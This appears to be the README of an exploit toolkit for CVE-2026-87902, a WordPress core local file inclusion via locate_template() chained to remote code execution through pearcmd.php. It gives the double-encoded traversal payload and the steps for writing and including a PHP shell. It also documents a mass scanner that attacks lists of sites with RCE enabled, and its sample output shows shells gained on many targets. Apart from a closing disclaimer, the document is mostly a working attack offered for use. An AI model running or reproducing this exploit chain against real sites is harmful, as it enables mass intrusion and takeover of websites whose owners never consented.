# CVE-2026-87902 — WordPress Core LFI via `locate_template()`

Unauthenticated Local File Inclusion (LFI) in WordPress core `locate_template()`.  
Leads to Remote Code Execution (RCE) via PHP PEAR `pearcmd.php` when `register_argc_argv=On`.

## Affected Versions

| Software | Version |
|---|---|
| WordPress | <= 7.1.1 |
| PHP | Any (requires `register_argc_argv=On`) |

Fixed in WordPress **7.1.2**.

---

## Technical Background

`locate_template()` resolves a caller-supplied template name without verifying the resolved path stays within the active theme directory. A double URL-encoded path traversal sequence bypasses the single `urldecode()` sanitization:

```
%252e%252e  →  (HTTP layer decodes %25 → %)  →  %2e%2e  →  (WP urldecode)  →  ..
```

Single encoding (`%2e%2e`) is consumed by the HTTP layer and never reaches WordPress.

The LFI is triggered via the `pagename` query parameter:

```
/?page_id=2&pagename=templates%252F%252e%252e%252F%252e%252e%252F..%252Fusr%252Fshare%252Fphp%252Fpearcmd+config-show
```

With `register_argc_argv=On`, PHP maps the URL query string to `$argv`, allowing `pearcmd.php` to accept commands. The `config-create` command writes a PHP stub to a target path, which is then included via a second LFI request.

---

## Requirements

- Python 3.8+
- `requests` library

```bash
pip install requests
```

---

## Files

| File | Description |
|---|---|
| `poc.py` | Single target scanner — full LFI/RCE exploit |
| `mass.py` | Mass scanner — scan banyak target dari file sekaligus |

---

## poc.py — Single Target

### Basic scan

```bash
python3 poc.py https://target.com
```

### Verbose output

```bash
python3 poc.py https://target.com -v
```

### Thorough mode (probe all 32 known themes + brute-force page IDs 1–200)

```bash
python3 poc.py https://target.com --thorough -v
```

### Attempt RCE after LFI confirmed

```bash
python3 poc.py https://target.com --rce -v
```

### RCE with custom PHP stub write path

```bash
python3 poc.py https://target.com --rce --write-path /var/www/html/wp-content/uploads/shell.php -v
```

### JSON output

```bash
python3 poc.py https://target.com --json
python3 poc.py https://target.com --json > result.json
```

### Override specific phase values (skip discovery)

```bash
# Use a known page_id directly (skip page discovery)
python3 poc.py https://target.com --page-id 5

# Use a known theme name (skip theme enumeration)
python3 poc.py https://target.com -t astra

# Use a specific traversal depth only
python3 poc.py https://target.com -d 9

# Combine overrides
python3 poc.py https://target.com --page-id 5 -t astra -d 9 --rce -v
```

### Custom port (Apache backend behind LiteSpeed reverse proxy)

```bash
python3 poc.py https://target.com --port 8080 -v
```

### Authenticated scan (with session cookie)

```bash
python3 poc.py https://target.com --cookie "wordpress_logged_in_xxx=user%7C..." -v
```

### Custom HTTP headers

```bash
python3 poc.py https://target.com -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1"
```

### All Flags — poc.py

| Flag | Default | Description |
|---|---|---|
| `target` | (required) | Target base URL |
| `--rce` | off | Attempt RCE via pearcmd `config-create` after LFI confirmed |
| `--write-path PATH` | `/tmp/wp_shell.php` | PHP stub write path for RCE stage |
| `--thorough` | off | Probe all known themes + brute-force page IDs 1–200 |
| `--threads N` | `10` | Worker thread count |
| `--port N` | auto | Override destination port |
| `--cookie STR` | — | Cookie header value |
| `-H HEADER` | — | Extra HTTP header (repeatable) |
| `--json` | off | Output JSON result |
| `-v / --verbose` | off | Verbose per-request output |
| `--page-id N` | — | Override: skip page discovery, use this page_id |
| `-t / --theme NAME` | — | Override: skip theme enum, use this theme |
| `-d / --depth N` | — | Override: use only this traversal depth |

---

## mass.py — Mass Scanner

Scan ratusan target sekaligus dari satu file. Setiap target dijalankan secara concurrent, hasil otomatis disimpan ke folder output.

### Setup targets

Buat file `targets.txt` (satu URL per baris, baris `#` diabaikan):

```
https://site1.com
https://site2.com
http://site3.com
# ini komentar, diabaikan
https://site4.com
```

### Basic scan

```bash
python3 mass.py targets.txt
```

### Dengan RCE + lebih cepat

```bash
python3 mass.py targets.txt --rce --mass-threads 10 --threads 15
```

### Thorough mode

```bash
python3 mass.py targets.txt --thorough --mass-threads 5
```

### Output JSON

```bash
python3 mass.py targets.txt --format json --output hasil/
```

### Dengan delay antar target (hindari rate limit)

```bash
python3 mass.py targets.txt --delay 1.5
```

### Custom cookie + header untuk semua target

```bash
python3 mass.py targets.txt --cookie "session=abc123" -H "X-Forwarded-For: 127.0.0.1"
```

### All Flags — mass.py

| Flag | Default | Description |
|---|---|---|
| `targets` | (required) | File berisi daftar URL target |
| `--mass-threads N` | `5` | Jumlah target yang berjalan bersamaan |
| `--threads N` | `10` | Thread per target (LFI probe) |
| `--rce` | off | Coba RCE kalau LFI berhasil |
| `--write-path PATH` | `/tmp/wp_shell.php` | PHP stub path untuk RCE |
| `--thorough` | off | Probe semua theme + brute page IDs |
| `--port N` | auto | Override port |
| `--cookie STR` | — | Cookie header |
| `-H HEADER` | — | Extra HTTP header (repeatable) |
| `--output DIR` | `mass_results` | Folder output |
| `--format` | `txt` | Format output: `txt` atau `json` |
| `--delay N` | `0` | Jeda detik antar target |
| `--theme NAME` | — | Force theme name (skip enum) |
| `--page-id N` | — | Force page_id (skip discovery) |
| `--depth N` | — | Force traversal depth |

### Output Files

Hasil disimpan otomatis ke folder `mass_results/` (atau `--output`):

```
mass_results/
├── vuln_20261026_143022.txt    ← target vulnerable (LFI confirmed)
├── waf_20261026_143022.txt     ← target kena WAF/blocked
├── dead_20261026_143022.txt    ← target tidak vulnerable
└── results_20261026_143022.json  ← (kalau --format json)
```

### Contoh Output

```
╔═══════════════════════════════════════════════════════════════╗
║  CVE-2026-87902 — WordPress LFI Mass Scanner                 ║
╚═══════════════════════════════════════════════════════════════╝
[*] Targets      : 50
[*] Mass threads : 10
[*] Per-target   : 10 threads
[*] RCE          : True
[*] Output dir   : mass_results

[1/50] [VULN] https://site1.com
        LFI: page_id=2 theme=astra depth=8
        RCE: uid=33(www-data) gid=33(www-data) groups=33(www-data)
[2/50] [WAF]  https://site2.com (Cloudflare/Imunify360)
[3/50] [-]    https://site3.com
...

=================================================================
SCAN COMPLETE  — 50 targets
  VULNERABLE : 12
  RCE        : 8
  WAF BLOCKED: 15
  NOT VULN   : 23
=================================================================

[*] Results saved to: mass_results/
    vuln_20261026_143022.txt  — 12 vulnerable
    waf_20261026_143022.txt   — 15 WAF blocked
    dead_20261026_143022.txt  — 23 not vulnerable
```

---

## Scan Phases

```
Phase 1  WordPress version + server header detection
Phase 2  Theme enumeration
           └─ active theme from HTML source
           └─ installed themes from /wp-content/themes/ directory listing
           └─ [--thorough] probe all 32 known popular themes
Phase 3  Page discovery
           └─ REST API  /wp-json/wp/v2/pages
           └─ Sitemap   /sitemap.xml, /wp-sitemap.xml
           └─ [--thorough] brute-force page_id 1–200
Phase 4  Template validation
           └─ keep only pages with default/empty template
           └─ skip Elementor, Divi, and other builder templates
Phase 5  LFI probe  (threaded)
           └─ combos: pages × themes × depths [7–11] × 24 pearcmd paths
           └─ confirms via PEAR output markers only (no false positives)
Phase 6  RCE chain  [--rce]
           └─ Stage 1: pearcmd config-create writes PHP stub
           └─ Stage 2: LFI includes stub, executes id command
           └─ confirms via uid= output pattern
```

---

## Exit Codes

| Code | Meaning |
|---|---|
| `0` | LFI confirmed |
| `1` | LFI not confirmed (or WAF blocked) |

---

## WAF Compatibility

| Environment | LFI via HTTP | Notes |
|---|---|---|
| Apache / Nginx (no WAF) | **Works** | Double encoding reaches PHP |
| LiteSpeed + Imunify360 | **Blocked** | WAF drops traversal at kernel level |
| Cloudflare WAF | **Blocked** | Managed rule blocks `%25` sequences |
| cPanel + Apache (no WAF) | **Works** | Most common exploitable config |

When WAF is detected, the script reports the type and exits cleanly — no false positives.

---

## Example Output — poc.py

```
╔═══════════════════════════════════════════════════════════════╗
║  CVE-2026-87902 — WordPress LFI via locate_template()        ║
║  Affects: WordPress <= 7.1.1  |  Unauthenticated             ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target  : https://target.com
[*] Threads : 10  Thorough: False

[Phase 1] WordPress detection
  [*] WP version: 6.7.2  Server: Apache/2.4.62

[Phase 2] Theme enumeration
  [+] Active theme from HTML: astra
    [*] Theme page-dir: page-templates (HTTP 403)
  [*] Total themes: 1

[Phase 3] Page discovery
  [*] REST API: found 4 pages

[Phase 4] Template validation (4 pages)
  [-] Skipping page 3 (contact): template=elementor_header_footer
  [*] Exploitable pages (default template): 3

[Phase 5] LFI probe
  [*] LFI combos: 360 (3 pages x 1 themes x 5 depths x 24 pearcmd paths)
  [+] LFI CONFIRMED: page_id=2 theme=astra depth=8 pear=/opt/alt/php81/usr/share/pear/pearcmd

=================================================================
TARGET : https://target.com
WP VER : 6.7.2
SERVER : Apache/2.4.62
THEMES : 1
PAGES  : 4

[+] LFI CONFIRMED
    Page ID : 2 (sample-page)
    Theme   : astra (suffix=templates)
    Depth   : 8
    Pear    : /opt/alt/php81/usr/share/pear/pearcmd
    URL     : https://target.com/?page_id=2&pagename=templates%252F...
=================================================================
```

---

## Disclaimer

This tool is intended for authorized security testing, CTF challenges, and educational research only. Use only against systems you own or have explicit written permission to test. Unauthorized use is illegal.
